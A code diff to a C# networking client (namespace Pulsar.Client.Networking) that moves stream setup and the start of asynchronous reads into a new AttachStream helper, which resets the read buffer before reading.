@@ -239,9 +239,8 @@ namespace Pulsar.Client.Networking
 
                 if (handle.Connected)
                 {
-                    _stream = new NetworkStream(handle, true);
-                    _stream.BeginRead(_readBuffer, _readOffset, _readBuffer.Length, AsyncReceive, null);
-                    OnClientState(true);
+                    var stream = new NetworkStream(handle, ownsSocket: true);
+                    AttachStream(stream);
                 }
                 else
                 {
@@ -253,6 +252,24 @@ namespace Pulsar.Client.Networking
                 handle?.Dispose();
                 OnClientFail(ex);
             }
+        }
+
+        /// <summary>
+        /// Attaches an already established stream to the client and begins reading.
+        /// </summary>
+        /// <param name="stream">The stream to attach.</param>
+        protected void AttachStream(Stream stream)
+        {
+            Disconnect();
+
+            _stream = stream ?? throw new ArgumentNullException(nameof(stream));
+
+            _readBuffer = new byte[HEADER_SIZE];
+            _readOffset = 0;
+            _readLength = HEADER_SIZE;
+
+            _stream.BeginRead(_readBuffer, _readOffset, _readBuffer.Length, AsyncReceive, null);
+            OnClientState(true);
         }
 
         private void AsyncReceive(IAsyncResult result)
